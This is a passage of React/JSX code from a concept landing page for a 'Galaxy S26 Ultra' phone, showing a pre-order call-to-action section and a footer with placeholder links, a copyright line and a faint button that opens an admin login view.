      {/* CTA Section */}
      <section className="py-32 px-6 relative overflow-hidden">
        <div className="absolute inset-0 bg-blue-600/10 -z-10" />
        <div className="max-w-7xl mx-auto text-center">
          <h2 className="text-5xl md:text-8xl font-black mb-10">Ready for the future?</h2>
          <p className="text-xl text-white/60 mb-12">Starting at $1,299. Available in 4 stunning finishes.</p>
          <div className="flex flex-col sm:flex-row gap-6 justify-center">
            <button className="bg-white text-black px-12 py-5 rounded-full font-bold text-xl hover:bg-white/90 transition-all hover:scale-105">
              Pre-order Now
            </button>
            <button className="bg-white/10 backdrop-blur-md text-white px-12 py-5 rounded-full font-bold text-xl hover:bg-white/20 transition-all">
              Compare Models
            </button>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="py-20 px-6 border-t border-white/10">
        <div className="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-12">
          <div className="col-span-1 md:col-span-2">
            <div className="flex items-center gap-2 mb-6">
              <Smartphone className="w-8 h-8 text-blue-500" />
              <span className="text-xl font-bold tracking-tighter uppercase">Galaxy S26 Ultra</span>
            </div>
            <p className="text-white/50 max-w-sm mb-8">
              Experience the next generation of mobile technology. Innovation that inspires, performance that empowers.
            </p>
            <div className="flex gap-6">
              <a href="#" className="text-white/50 hover:text-white transition-colors">Twitter</a>
              <a href="#" className="text-white/50 hover:text-white transition-colors">Instagram</a>
              <a href="#" className="text-white/50 hover:text-white transition-colors">YouTube</a>
            </div>
          </div>
          
          <div>
            <h4 className="font-bold mb-6">Product</h4>
            <ul className="space-y-4 text-white/50 text-sm">
              <li><a href="#" className="hover:text-white transition-colors">Overview</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Design</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Camera</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Performance</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Specs</a></li>
            </ul>
          </div>

          <div>
            <h4 className="font-bold mb-6">Support</h4>
            <ul className="space-y-4 text-white/50 text-sm">
              <li><a href="#" className="hover:text-white transition-colors">Contact Us</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Order Status</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Returns</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Warranty</a></li>
              <li><a href="#" className="hover:text-white transition-colors">FAQ</a></li>
            </ul>
          </div>
        </div>
        <div className="max-w-7xl mx-auto mt-20 pt-8 border-t border-white/5 flex flex-col md:flex-row justify-between items-center gap-4">
          <div className="text-white/30 text-xs">
            © 2026 Samsung Electronics Co., Ltd. All rights reserved. Concept landing page for demonstration purposes.
          </div>
          <button 
            onClick={() => setShowAdminLogin(true)}
            className="text-white/20 hover:text-white/50 text-[10px] uppercase tracking-widest transition-colors"
          >
            Admin Access
          </button>
        </div>
      </footer>
    </div>
  );
}
